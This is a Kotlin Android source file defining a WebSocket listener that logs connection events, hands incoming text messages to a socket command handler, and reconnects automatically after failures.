package com.hawkshaw.library.datalayer.network.socket

import android.os.Build
import com.hawkshaw.library.logger.Logger
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import okio.ByteString
import android.util.Log // Added for logging
import androidx.annotation.RequiresApi

/**
 * WebSocket listener that handles events from the socket connection
 */
class SocketListener(private val socketService: SocketService) : WebSocketListener() {
    private val TAG = "SocketService" // Existing TAG
    private val scope = CoroutineScope(Dispatchers.IO)
    
    /**
     * Called when the WebSocket connection has closed
     */
    override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
        Log.d(TAG, "[DEBUG] onClosed called. Code: $code, Reason: $reason")
        Logger.v(TAG, "OnClosed: code=$code, reason=$reason", false, 4, null) // Existing Logger call
        handleDisconnection(webSocket, false)
    }

    /**
     * Called when the WebSocket connection fails and is closing
     */
    override fun onClosing(webSocket: WebSocket, code: Int, reason: String) {
        Log.d(TAG, "[DEBUG] onClosing called. Code: $code, Reason: $reason")
        Logger.v(TAG, "OnClosing: code=$code, reason=$reason", false, 4, null) // Existing Logger call
        handleDisconnection(webSocket, true)
    }

    /**
     * Called when a WebSocket connection has been established
     */
    override fun onOpen(webSocket: WebSocket, response: Response) {
        Log.d(TAG, "[DEBUG] onOpen called. Response message: ${response.message}")
        Logger.v(TAG, "OnOpen: ${response.message}", false, 4, null) // Existing Logger call
    }

    /**
     * Called when a text message has been received
     */
    @RequiresApi(Build.VERSION_CODES.P)
    override fun onMessage(webSocket: WebSocket, text: String) {
        Log.d(TAG, "[DEBUG] onMessage (text) called. Text: $text")
        // Existing call to handle the command
        SocketCommandResolverKt.handleSocketCommand(text)
    }

    /**
     * Called when a binary message has been received
     */
    override fun onMessage(webSocket: WebSocket, bytes: ByteString) {
        Log.d(TAG, "[DEBUG] onMessage (binary) called. ByteString: ${bytes.hex()}")
        Logger.v(TAG, "OnMessage: Binary message received", false, 4, null) // Existing Logger call
    }

    /**
     * Called when a WebSocket connection fails
     */
    override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
        val responseMessage = response?.message ?: "null"
        Log.e(TAG, "[DEBUG] onFailure called. Throwable: ${t.message}, Response message: $responseMessage", t) // Added for standard Logcat
        Logger.e(TAG, "OnFailure: ${t.message}", Exception(t), false, 12, null) // Existing Logger call
        handleDisconnection(webSocket, false)
    }

    /**
     * Handle WebSocket disconnection events
     */
    private fun handleDisconnection(webSocket: WebSocket, isClosing: Boolean) {
        Log.d(TAG, "[DEBUG] handleDisconnection called. isClosing: $isClosing")
        if (!isClosing) {
            Log.d(TAG, "[DEBUG] handleDisconnection: Not closing normally, attempting to reconnect after a delay.")
            // If not closing normally, attempt to reconnect after a delay
            scope.launch {
                Log.d(TAG, "[DEBUG] handleDisconnection: Coroutine launched to attempt reconnection with a 5000ms delay.")
                socketService.connect(webSocket, 5000)
                Log.d(TAG, "[DEBUG] handleDisconnection: socketService.connect call completed.")
            }
        } else {
            Log.d(TAG, "[DEBUG] handleDisconnection: WebSocket is closing normally or already handled.")
        }
    }
} 
